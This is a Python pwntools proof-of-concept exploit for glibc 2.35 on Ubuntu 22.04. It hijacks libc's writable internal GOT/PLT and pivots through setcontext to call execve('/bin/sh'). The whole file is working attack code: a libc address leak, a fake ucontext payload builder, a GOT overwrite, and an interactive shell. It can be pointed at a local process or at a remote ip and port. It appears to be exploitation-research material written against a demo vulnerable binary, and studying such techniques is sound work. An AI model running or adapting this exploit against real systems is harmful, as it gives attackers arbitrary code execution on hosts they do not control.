# Title       : PoC for Hijacking glibc internal GOT/PLT to RCE
# Author      : Axura
# Target      : GLIBC 2.35-0ubuntu3.4 (Ubuntu 22.04)
# Website     :
# Vuln script : https://github.com/4xura/pwn-libc-got/blob/main/demo/vuln.c
# Tags        : PLT0, GOT0, writable _GLOBAL_OFFSET_TABLE_, setcontext, smaller context buffer


import sys
import inspect
from pwn import *


s       = lambda data                 :p.send(data)
sa      = lambda delim,data           :p.sendafter(delim, data)
sl      = lambda data                 :p.sendline(data)
sla     = lambda delim,data           :p.sendlineafter(delim, data)
r       = lambda num=4096             :p.recv(num)
ru      = lambda delim, drop=True     :p.recvuntil(delim, drop)
l64     = lambda                      :u64(p.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))
uu64    = lambda data                 :u64(data.ljust(8, b"\0"))


def g(gdbscript: str = ""):
    if mode["local"]:
        gdb.attach(p, gdbscript=gdbscript)
        
    elif mode["remote"]:
        gdb.attach((remote_ip_addr, remote_port), gdbscript)
        if gdbscript == "":
            raw_input()


def pa(addr: int) -> None:
    frame = inspect.currentframe().f_back
    variables = {k: v for k, v in frame.f_locals.items() if v is addr}
    desc = next(iter(variables.keys()), "unknown")
    success(f"[LEAK] {desc} ---> {addr:#x}")


def create_ucontext(src: int, *, rdi=0, rsi=0, rbp=0, rbx=0, rdx=0, rcx=0,
                    rsp=0, rip=0xdeadbeef) -> bytearray:
    b = flat({
        0x68: rdi,
        0x70: rsi,
        0x78: rbp,
        0x80: rbx,
        0x88: rdx,
        0x98: rcx,
        0xA0: rsp,
        0xA8: rip,  # ret ptr
        0xE0: src,  # fldenv ptr
        # 0x1C0: 0x1F80,  # assume ldmxcsr == 0
    }, filler=b'\0', word_size=64)
    return b[0x68:]


def setcontext32(libc: ELF, offset=8, **kwargs) -> (int, bytes):
    """Add offset to fake context buffer to assure ldmxcsr==0"""
    global GOT_ET_COUNT

    got0 = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    pa(got0)
    pa(plt0)

    write_dest = got0 + 8
    context_dest = write_dest + 0x10 + GOT_ET_COUNT * 8 - 0x68 + offset

    write_data = flat(
        context_dest,               # _GLOBAL_OFFSET_TABLE_+8   ->  ucontext_t *ucp
        libc.sym.setcontext + 32,   # _GLOBAL_OFFSET_TABLE_+16  ->  setcontext+32 gadget
        [plt0] * GOT_ET_COUNT,
        b"\x00" * offset,
        create_ucontext(context_dest, rsp=libc.sym.environ+8, **kwargs),
    )

    warn("Ensure [0x{:x} (offset 0x{:x} in libc)] == 0 — this is used as `ldmxcsr` by `setcontext`".format(
        context_dest + 0x1c0,
        context_dest + 0x1c0 - libc.address
    ))

    return write_dest, write_data


def exp():
    """
    11ee:       e8 5d fe ff ff          call   1050 <printf@plt>
    """
    g("breakrva 0x11ee")

    leak = int(ru(b"\n"), 16)
    libc_base = leak - libc.sym.printf
    pa(libc_base)
    libc.address = libc_base

    write_dest, write_data = setcontext32(
            libc,
            rip = libc.sym.execve,
            rdi = libc.search(b"/bin/sh\x00").__next__(),
            rsi = 0,
            rdx = 0,
            )

    s(p64(write_dest))
    s(p64(len(write_data)))
    s(write_data)

    success("Payload written to: {}\nPayload length: {}".format(hex(write_dest), hex(len(write_data))))

    # pause()
    p.interactive()


if __name__ == '__main__':
    """pwndbg> tel &_GLOBAL_OFFSET_TABLE_ 60
    00:0000│  0x7ffff7fa7000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x218bc0
    01:0008│  0x7ffff7fa7008 (_GLOBAL_OFFSET_TABLE_+8) —▸ 0x7ffff7fbb160 —▸ 0x7ffff7d8e000 ◂— 0x3010102464c457f
    02:0010│  0x7ffff7fa7010 (_GLOBAL_OFFSET_TABLE_+16) —▸ 0x7ffff7fd8d30 (_dl_runtime_resolve_xsavec) ◂— endbr64
    03:0018│  0x7ffff7fa7018 (*ABS*@got.plt) —▸ 0x7ffff7f2bb60 (__strnlen_avx2) ◂— endbr64
    04:0020│  0x7ffff7fa7020 (*ABS*@got.plt) —▸ 0x7ffff7f27790 (__rawmemchr_avx2) ◂— endbr64
    [...]
    37:01b8│  0x7ffff7fa71b8 (_dl_audit_preinit@got.plt) —▸ 0x7ffff7fde660 (_dl_audit_preinit) ◂— endbr64
    38:01c0│  0x7ffff7fa71c0 (*ABS*@got.plt) —▸ 0x7ffff7f2bb60 (__strnlen_avx2) ◂— endbr64
    39:01c8│  0x7ffff7fa71c8 ◂— 0x0
    3a:01d0│  0x7ffff7fa71d0 ◂— 0x0"""
    GOT_ET_COUNT = 0x36

    FILE_PATH = "./vuln"
    LIBC_PATH = "/usr/lib/x86_64-linux-gnu/libc.so.6"

    context(arch="amd64", os="linux", endian="little")
    context.log_level = "debug"
    context.terminal  = ['tmux', 'splitw', '-h']    # ['<terminal_emulator>', '-e', ...]

    e    = ELF(FILE_PATH, checksec=False)
    mode = {"local": False, "remote": False, }
    env  = None

    print("Usage: python3 xpl.py [<ip> <port>]\n"
                "  - If no arguments are provided, runs in local mode (default).\n"
                "  - Provide <ip> and <port> to target a remote host.\n")

    if len(sys.argv) == 3:
        if LIBC_PATH:
            libc = ELF(LIBC_PATH)
        p = remote(sys.argv[1], int(sys.argv[2]))
        mode["remote"] = True
        remote_ip_addr = sys.argv[1]
        remote_port    = int(sys.argv[2])
        
    elif len(sys.argv) == 1:
        if LIBC_PATH:
            libc = ELF(LIBC_PATH)
            env = {
                "LD_PRELOAD": os.path.abspath(LIBC_PATH),
                "LD_LIBRARY_PATH": os.path.dirname(os.path.abspath(LIBC_PATH))
            }
        p   = process(FILE_PATH, env=env)
        mode["local"] = True
    else:
        print("[-] Error: Invalid arguments provided.")
        sys.exit(1)

    exp()
